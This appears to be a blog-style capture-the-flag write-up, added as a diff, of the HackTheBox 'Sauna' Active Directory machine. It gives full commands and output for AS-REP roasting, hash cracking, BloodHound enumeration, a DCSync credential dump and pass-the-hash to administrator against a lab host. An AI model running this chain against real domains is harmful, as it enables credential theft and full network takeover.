@@ -1,0 +1,213 @@
+---
+title: Writeup - HackTheBox - Sauna
+published: true
+---
+
+This machine from HackTheBox is tagged as an easy Windows machine. I dont have so much experience from Windows machines before so this took me very much more time than it should.
+The ip-address of the box at this moment is 10.10.10.175.
+
+## [](#header-2)Enumeration
+
+Staring enumeration with nmap.
+
+```
+nmap -sC -sV -oA nmap 10.10.10.175
+```
+![](Pictures/Sauna/nmap.png)
+
+We can see that there is a lot of ports open. We also get a domainname and a hostname. So we edit our /etc/hosts file and put this there.
+EGOTISTICAL-BANK.LOCAL and SAUNA.EGOTISTICAL-BANK.LOCAL
+
+There is an webserver, so lets taka look at that. If we look at the about.html site we found some names of people:
+```
+Fergus Smith
+Hugo Bear
+Steven Kerb
+Shaun Coins
+Bowie Taylor
+Sophie Driver
+```
+
+Maybe anyone of this can have a user on the server? We can test this with generating a list of potential usernames. I found this tool useful: https://github.com/urbanadventurer/username-anarchy
+```
+git clone https://github.com/urbanadventurer/username-anarchy
+```
+
+Im staring with saving the names in a file, names.txt and than i use the tool as the following:
+```
+./username-anarchy -i ../names.txt > ../users.txt
+```
+I now have 88 lines in my new file users.txt, with potential usernames.
+
+## [](#header-2)Exploitation
+### [](#header-3)GetNPUsers
+
+So the next step is to try out our usernames against the domain. I use the following tool to try to get some hits from my list 'users.txt' and also hopfully get a hashed password back: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py.
+```
+git clone https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+```
+```
+python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+```
+It worked! I got this back:
+```
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:34bf035ce06448cecb700e0127917b73$373cf344db83d3319ded886188eaf793f37b7f42ebe46c244d4f2ec6227def5308372e8897348a2e2a77fd033df0bd0999b6e1b305d911870903aa91ac8adb560280067923c14e86bfd23ccaaeb6fdf87c684afb0a4764097af6d7e40ec96f9a581cb800b8b42483b6420f7931150df09f2f98384087b84cb98cd5511f3e53afc2e633868796f237692a6378a9e73bd1ac503fce7882754e3ece9679f7aa350b73c1745c6fca3c00ff8a107669b3fdcb12cd24332b9d459fa94d781aedab245043b940fba79f5a4d84fb220380c11864fefc37b48d30f4d51bba80f121deb581425a2ba5a33899d3f370d7afdba7972790c2fc3dad3e8286624b0604b9c6cdea
+```
+### [](#header-3)JohnTheRipper
+Here we got the a match from the users.txt list, fsmith with his hashed password. Im using johntheripper to try to crack the hash.
+```
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
+```
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Thestrokes23 ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
+1g 0:00:00:13 DONE (2020-05-29 13:11) 0.07485g/s 788847p/s 788847c/s 788847C/s Thing..Thehunter22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+Cracked! Password for the user is: Thestrokes23
+### [](#header-3)Bloodhound.py
+So now we want to get some more information and then we run bloodhound.py. Bloodhound.py is a script that connects to the domain with the credentials and gets more information from the domain. So we download the script and then we run it with the creds that we got.
+
+```
+git clone https://github.com/fox-it/BloodHound.py
+```
+```
+python bloodhound.py -u fsmith -p Thestrokes23 -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175
+```
+Now we got som .json files back:
+```
+computers.json
+domains.json
+groups.json
+users.json
+```
+
+### [](#header-3)Bloodhound
+We should open this in bloodhound to see what information we can get out of it. Bloodhound is using neo4j database and both can be downloaded via apt in kali. When we have neo4j we have to change the standard password and then we can run bloodhound and log in.
+```
+sudo neo4j start
+```
+```
+bloodhound
+```
+```
+
+![](Pictures/Sauna/blood1.png)
+### [](#header-3)Evil-winrm
+Here we can see that fsmith is a member of the remote management group, wich tells us that he can log in with winrm. So for this we can use the tool Evil-Winrm (https://github.com/Hackplayers/evil-winrm).
+
+```
+evil-winrm -u fsmith -p Thestrokes23 -i EGOTISTICAL-BANK.LOCAL
+```
+
+![](Pictures/Sauna/evil1.png)
+
+And here is the user flag.
+### [](#header-3)PowerUp.ps1
+So now we want more information about the system. To get that we can do some enumeration with the PowerUp.ps1 script. Get it some powersploit.
+```
+sudo apt install powersploit -y
+```
+PowerUp.ps1 is located under the Privesc folder in Powersploit. Copy that from there to your working directory.
+```
+cp PowerUp.ps1 /home/kali/MEGA/Boxes/sauna/2/
+```
+We should now edit the script by adding 'Invoke-AllChecks', without the ', in the end of the file PowerUp.ps1. Now we go back to the Evil-Winrm terminal, upload and run the script.
+```
+upload PowerUp.ps1
+```
+```
+./PowerUp.ps1
+```
+We now got this information:
+
+```
+DefaultDomainName : EGOTISTICALBANK
+DefaultUserName : EGOTISTICALBANK\svc_loanmanager
+DefaultPassword : Moneymakestheworldgoround!
+AltDefaultDomainName :
+AltDefaultUserName :
+AltDefaultPassword :
+```
+We now got a new username and a password, this time in cleartext. (svc_loanmanager:Moneymakestheworldgoround!)
+### [](#header-3)SharpHound.exe
+We want to get some more information of the domain, and to get this i can run SharpHound.exe while logged in with Evil-Winrm. Start with downloading blooudhound from git to get all the files.
+```
+git clone https://github.com/BloodHoundAD/BloodHound.git
+```
+
+From the folder bloodhound/Ingestors we copy SharpHound.exe to our woring dir and then we upload it from Evil-Winrm.
+```
+upload SharpHound.exe
+```
+```
+./SharpHound.exe
+```
+We now got a zip-archive that we can download to our kali machine.
+```
+download 20200529082159_BloodHound.zip
+```
+### [](#header-3)Bloodhound
+We startup Bloodhound from the kali machine again and clear the database. Then we load the zip-archive. If we take a closer look at the user svc_loanmgr we can see that he got DCSync rights.
+
+![](Pictures/Sauna/blood2.png)
+
+### [](#header-3)secretsdump.py
+We can use this knowledge to get some NTLM-hashes from the domain. For this we can use secretsdump.py (https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Download and run it like this:
+```
+python secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@EGOTISTICAL-BANK.LOCAL
+```
+```
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:fb6ab1db54ae0244f7f0ec73e94aa58e:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
+Administrator:des-cbc-md5:19d5f15d689b1ce5
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:9e0e0fab4b416273870d3b5ef8d7ad4483ea0f2690ee4bc8036851bea6aaaffa
+SAUNA$:aes128-cts-hmac-sha1-96:13175dfb95b081e919b3257b04761d1d
+SAUNA$:des-cbc-md5:104c515b86739e08
+[*] Cleaning up...
+```
+We got this information back.
+### [](#header-3)Evil-winrm - passthehash
+Now we got the administrators hash. We can try to crack it with john or hashcat or we can use passthehash and try to log in to the system. We use Evil-Winrm to log in with passthehash as following:
+```
+evil-winrm -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
+```
+![](Pictures/Sauna/evil2.png)
+
+And now we can read the root.txt flag.
+
+### [](#header-3)Bloodhound
+
+INSERT VIDEO HERE!!!
+I recorded a video to show this below.
+<iframe width="640" height="360" src="https://www.youtube.com/embed/EwWuhC2voB4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
